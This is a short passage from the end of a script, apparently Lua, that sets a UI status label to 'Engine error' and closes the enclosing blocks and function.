			uiStatus.Text = "Engine error"
		end
	end
end)
